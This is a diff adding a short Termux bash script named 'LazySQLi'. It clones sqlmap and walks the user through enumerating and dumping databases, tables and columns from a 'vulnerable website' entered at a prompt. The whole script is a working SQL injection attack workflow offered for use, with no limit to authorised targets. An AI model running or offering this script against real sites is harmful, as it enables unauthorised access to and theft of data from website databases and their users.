@@ -1,0 +1,22 @@
+#!/data/data/com.termux/files/usr/bin/bash
+pkg install git -y
+git clone https://github.com/sqlmapproject/sqlmap
+pkg install python2 -y
+apt install toilet -y
+clear
+toilet -f mono12 -F gay "LazySQLi"
+echo "Enter vulnerable website link :"
+read site
+cd sqlmap
+python2 sqlmap.py -u $site --dbs
+echo "Enter the name of the database you got from sqlmap"
+read db
+python2 sqlmap.py -u $site -D $db --tables
+echo "enter the table to view its columns"
+read tb
+python2 sqlmap.py -u $site -D $db -T $tb --columns
+echo "Enter the column to dump data use , (comma) for multiple columns :"
+read col
+python2 sqlmap.py -u $site -D $db -T $tb -C $col --dump
+echo "Thankyou for using my tool :)"
+echo "© Ashish Rohra"
